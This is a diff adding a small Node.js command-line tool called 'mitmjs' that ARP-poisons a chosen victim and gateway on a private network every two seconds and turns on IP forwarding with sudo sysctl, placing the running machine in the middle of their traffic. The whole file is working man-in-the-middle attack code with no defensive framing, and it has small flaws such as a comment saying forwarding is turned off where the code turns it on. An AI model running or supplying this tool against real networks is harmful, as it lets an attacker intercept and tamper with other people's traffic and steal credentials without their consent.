@@ -1,0 +1,86 @@
+#!/usr/bin/env node
+
+var arp = require('arpjs');
+var ip = require('ip');
+var argv = require('optimist')
+    .usage('Usage: mitmjs -victim [IP Address] -gateway [IP Address]')
+    .alias('v', 'victim')
+    .alias('g', 'gateway')
+    .alias('i', 'interface')
+    .describe('victim', 'Set the Victim IP Address')
+    .describe('gateway', 'Set the Gateway IP Address')
+    .describe('interface', 'Set the interface to be used')
+    .demand(['victim','gateway'])
+    .argv;
+
+if(argv.length < 2 || argv.v.length === 0 || !argv.g.length === 0){
+  argv.help();
+}
+
+if (argv.v && argv.g){
+  if(isRoot()){
+    // Validate if IP Address is Private
+    if(ip.isPrivate(argv.v) && ip.isPrivate(argv.g)){
+      // Turn IP Forwarding Off
+      ip_forward(1);
+      // Keep Poisoning every 2 seconds.
+      setInterval(function(){
+        arp.poison(argv.v, argv.g);
+        arp.poison(argv.g, argv.v);
+      }, 2000);
+      console.log('ARP Poisoning ' + argv.v + ' and ' + argv.g);
+    } else {
+      console.log('The IP Addresses must be a valid Private IP Address');
+      process.exit();
+    }
+  } else {
+    process.exit();
+  }
+}
+
+
+/* IP Forwarding for MAC OSX
+ * Sets the IP Forwarding Value in the Kernel.
+ * Or more Precisely, net.inet.ip.forwarding
+*/
+
+function ip_forward(x){
+  x = (x>0)? 1:0;
+  (x >= 1)? console.log('Turning on IP Forwarding') : console.log('\nTurning off IP Forwarding')
+  var a = require('child_process').exec('sudo sysctl -w net.inet.ip.forwarding='+ x);
+}
+
+
+
+// Clean Up Code
+
+process.stdin.resume();
+
+function exitHandler(options, err) {
+    if (options.cleanup) console.log('Quitting mitmjs');
+    if (err) console.log(err.stack);
+    if (options.exit) {
+      ip_forward(0);
+      process.exit();
+    }
+}
+
+//do something when app is closing
+process.on('exit', exitHandler.bind(null,{cleanup:true}));
+
+//catches ctrl+c event
+process.on('SIGINT', exitHandler.bind(null, {exit:true}));
+
+//catches uncaught exceptions
+process.on('uncaughtException', exitHandler.bind(null, {exit:true}));
+
+
+function isRoot(){
+  var uid = process.getuid();
+  if(uid !== 0){
+    console.log('You need to be a root user to run mitmjs.');
+    return 0;
+  }
+
+return 1;
+}
